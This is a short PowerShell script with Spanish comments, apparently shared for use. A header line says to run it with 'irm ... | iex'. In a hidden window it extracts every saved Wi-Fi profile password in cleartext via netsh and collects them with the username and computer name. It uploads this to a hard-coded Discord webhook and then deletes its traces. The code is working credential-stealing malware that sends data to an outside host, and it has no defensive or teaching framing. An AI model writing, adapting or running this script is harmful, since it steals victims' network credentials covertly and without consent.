# Ejecutar esto directamente con: irm https://raw.githubusercontent.com/tuscript.txt | iex

# Código invisible que se autoejecuta en segundo plano
$scriptBlock = {
    $webhookUrl = "https://discord.com/api/webhooks/1360605534838980780/BwDz68YsJ0nzDqi2eVFbZ6yWivXquWoUEIcc9hVBxBVLKiQnSGy8oDoccu2ctIy8HMtJ"
    $tempFile = "$env:TEMP\$env:USERNAME-WiFi.log"
    
    # Obtener redes WiFi
    $perfiles = (netsh wlan show profiles) | Select-String "Perfil de todos los usuarios" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    } | Sort-Object -Unique

    # Generar reporte
    @"
Usuario: $env:USERNAME
Equipo: $env:COMPUTERNAME
Fecha: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')
=================================
REDES CON CONTRASEÑA:
"@ | Out-File $tempFile

    foreach ($red in $perfiles) {
        try {
            $pass = (netsh wlan show profile name="$red" key=clear | Select-String "Contenido de la clave\s+:\s+(.+)").Matches.Groups[1].Value
            if ($pass) { "`n$red : $pass" | Out-File $tempFile -Append }
        } catch {}
    }

    # Enviar a Discord
    curl.exe -F "file1=@$tempFile" $webhookUrl > $null
    Remove-Item $tempFile -Force
}

# Ejecutar en proceso oculto
Start-Process powershell.exe -ArgumentList "-NoExit -WindowStyle Hidden -Command &{ $scriptBlock }" -WindowStyle Hidden
